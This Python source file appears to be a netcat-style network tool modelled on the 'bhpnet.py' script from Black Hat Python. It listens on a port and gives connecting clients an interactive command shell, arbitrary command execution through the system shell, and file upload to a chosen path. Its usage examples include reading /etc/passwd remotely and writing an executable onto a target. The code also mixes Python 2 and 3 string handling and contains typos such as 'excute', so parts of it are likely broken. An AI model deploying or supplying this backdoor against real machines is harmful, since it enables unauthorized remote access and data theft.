import sys
import socket
import getopt
import threading
import subprocess


listen = False
command = False
upload = False
execute = ""
target = ""
upload_destination = ""
port = 0


def usage():
    doc = """Net Tool
    
    Usage: bhpnet.py -t target_host -p port
    -l --listen                 - listen on [host]:[port] for incomming connections
    -e --execute=file_to_run    - execute the given file upon receiving a connection
    -c --command                - initialize a commond shell
    -u --upload=destination     - upon receiving connection upload a file and write to [destination]


    Examples:
    bhpnet.py -t 192.168.0.1 -p 5555 -l -c
    bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\\\target.exe
    bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\"
    echo 'ASDFGHJKL' | bhpnet.py -t 192.168.0.1 -p 5555
    """

    print(doc)

    sys.exit(0)


def client_sender(buffer):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        client.connect((target, port))

        if len(buffer):
            client.send(buffer)

        while True:
            # Waiting for return.
            recv_len = 1
            resp = ""

            while recv_len:
                data = client.recv(4096)
                recv_len = len(data)
                resp += bytes.decode(data)

                if recv_len < 4096:
                    break
            
            print(resp)

            buffer = input("")
            buffer += "\n"
            client.send(bytes(buffer, encoding="utf8"))
    except Exception as err:
        print(str(err))
        print("[*] Exception! Exiting.")
        client.close()


def server_loop():
    global target

    if not len(target):
        target = "0.0.0.0"

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target, port))

    server.listen(5)

    while True:
        client_socket, addr = server.accept()

        client_thread = threading.Thread(target=client_handler, args=(client_socket,))
        client_thread.start()

def client_handler(client_socket):
    global upload
    global upload_destination
    global execute
    global command

    if len(upload_destination):
        file_buffer = ""
        
        while True:
            data = client_socket.recv(1024)

            if not data:
                break

            else:
                file_buffer += data

            try:
                with open(upload_destination, "wb") as file_desc:
                    file_desc.write(file_buffer)
                resp = "Successfully saved file to %s\r\n" % upload_destination
                client_socket.send(resp)
            except:
                resp = "Failed to saved file to %s\r\n" % upload_destination
                client_socket.send(resp)
        
    if len(execute):
        output = run_command(execute)
        client_socket.send(output)

    if command:
        while True:
            client_socket.send("<BHP#> ")

            cmd_buffer = ""
            while "\n" not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024)
                resp = run_command(cmd_buffer)
                client_socket.send(resp)


def run_command(command):
    command = command.rstrip()
    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)

    except:
        output = "Faild to execute command.\r\n"

    return output

def main():
    global listen
    global command
    global execute
    global target
    global upload_destination
    global port

    if not len(sys.argv[1:]):
        usage()

    try:
        opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu:",
        ["help", "listen", "excute", "target", "port", "command", "upload"])
    except getopt.GetoptError as err :
        print(str(err))
        usage()

    for o, a in opts:
        if o in ("-h", "--help"):
            usage()
        elif o in ("-l", "--listen"):
            listen = True
        elif o in ("-e", "--excute"):
            execute = a
        elif o in ("-c", "--command"):
            command = True
        elif o in ("-u", "--upload"):
            upload_destination = a
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p", "--port"):
            port = int(a)
        else:
            assert False, "Unhandled Option"

    # Listen port or send data.
    if not listen and len(target) and port > 0:
        buffer = sys.stdin.read()

        client_sender(buffer)

    # Start listening and preparing to upload files and execute commands.
    if listen:
        server_loop()


if __name__ == "__main__":
    main()